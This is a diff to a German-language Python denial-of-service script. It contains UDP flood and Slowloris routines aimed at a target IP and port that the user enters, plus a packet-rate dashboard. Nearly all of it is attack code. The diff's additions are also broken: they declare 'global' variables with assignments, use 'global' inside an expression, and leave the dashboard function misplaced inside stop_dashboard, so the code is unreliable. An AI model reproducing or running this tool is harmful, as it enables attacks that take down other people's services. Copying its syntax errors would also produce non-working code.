@@ -26,7 +26,7 @@ def show_banner(color):
 # UDP Flood
 def udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration):
     stop_event = threading.Event()
-    packet_counter = [0]  # List als mutable Zähler
+    global packet_counter = [0]  # List als mutable Zähler
 
     def udp_flood():
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -40,7 +40,7 @@ def udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration):
                 sock.sendto(udp_bytes, (ip, port))
                 packet_counter[0] += 1
                 elapsed = time.time() - start_time
-                if packet_counter[0] / elapsed > packet_rate:
+                if global packet_counter[0] / elapsed > packet_rate:
                     time.sleep(0.001)
             except:
                 pass
@@ -58,7 +58,7 @@ def udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration):
 # Slowloris (TCP Keep-Alive)
 def slowloris_attack(ip, port, threads, duration):
     stop_event = threading.Event()
-    packet_counter = [0]
+    global packet_counter = [0]
 
     def slowloris():
         sockets = []
@@ -105,31 +105,23 @@ def choose_color():
     }.get(choice, "\033[0m")
 
 # Live-Dashboard
-def dashboard():
-    global packet_counter
-    start_time = time.time()
-    while not stop_event.is_set():
-        elapsed = time.time() - start_time
-        rate = packet_counter / elapsed if elapsed > 0 else 0
-        print(f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s", end="")
-        time.sleep(1)
-
-# Dashboard-Funktion
-def start_dashboard(packet_counter, stop_event):
+def start_dashboard():
+    global packet_counter, stop_event  # Verwende die globalen Variablen
+    
+def stop_dashboard(dashboard_thread):
+    dashboard_thread.join()
+    
     def dashboard():
         start_time = time.time()
         while not stop_event.is_set():
             elapsed = time.time() - start_time
-            rate = packet_counter[0] / elapsed if elapsed > 0 else 0
-            print(f"\r[INFO] Gesendete Pakete: {packet_counter[0]} | Paketrate: {rate:.2f}/s", end="")
+            rate = packet_counter / elapsed if elapsed > 0 else 0
+            print(f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s", end="")
             time.sleep(1)
 
     dashboard_thread = threading.Thread(target=dashboard)
     dashboard_thread.start()
     return dashboard_thread
-
-def stop_dashboard(dashboard_thread):
-    dashboard_thread.join()
 
 # Hauptprogramm
 if __name__ == "__main__":
@@ -155,14 +147,22 @@ if __name__ == "__main__":
             packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))
 
             stop_event.clear()
+            dashboard_thread = start_dashboard()
             udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration)
+            stop_event.set()
+            stop_dashboard(dashboard_thread)
 
         elif choice == "2":  # Slowloris (TCP Keep-Alive)
             ip = input("Ziel-IP-Adresse: ")
             port = int(input("Ziel-Port: "))
             duration = int(input("Dauer des Angriffs (Sekunden): "))
             threads = int(input("Anzahl der Threads: "))
+
+            stop_event.clear()
+            dashboard_thread = start_dashboard()
             slowloris_attack(ip, port, threads, duration)
+            stop_event.set()
+            stop_dashboard(dashboard_thread)
 
         else:
             print("[INFO] Ungültige Auswahl, bitte erneut versuchen.")
